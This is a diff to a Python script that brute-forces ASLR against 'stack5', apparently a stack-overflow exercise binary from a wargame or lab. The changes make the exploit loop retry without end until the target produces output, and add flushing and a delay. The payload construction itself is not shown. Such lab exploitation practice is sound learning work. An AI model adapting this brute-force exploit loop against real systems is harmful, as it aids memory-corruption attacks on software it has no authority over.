@@ -7,10 +7,13 @@ from Opcoad import convert_opcode_bytes
 from Opcoad import generate_addrs
 from Opcoad import escape_hex
 from Opcoad import reverse_endianness
+from struct import pack
 from subprocess import Popen
 from subprocess import PIPE
 import os                                                                                        # os.path.join(), os.getcwd()
-from struct import pack
+import time
+import sys
+
 
 BINARY_NAME = "stack5"
 
@@ -88,7 +91,9 @@ def main():
     with open(BINARY_NAME + "-ASLR_brute_force.txt", "w") as output:
         commandList.append(absBinFilename)
         print("Attempting to brute force {}\n[".format(BINARY_NAME), end="")
-        for ignoreThis in range(0, upperLim):
+        sys.stdout.flush()
+        # for ignoreThis in range(0, upperLim):
+        while True:
             binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE, stderr = PIPE)
             if binary is not None:
                 # CONSTRUCT PAYLOAD
@@ -115,9 +120,13 @@ def main():
                 if tmpRet[0] or tmpRet[1]:
                     # print(tmpRet)  # DEBUGGING
                     print("!", end="")
+                    sys.stdout.flush()
                     output.write(tmpRet)
+                    break
                 else:
                     print(".", end="")
+                    sys.stdout.flush()
+                time.sleep(1)
                 binary.wait()  # Block                
     print("]")
 
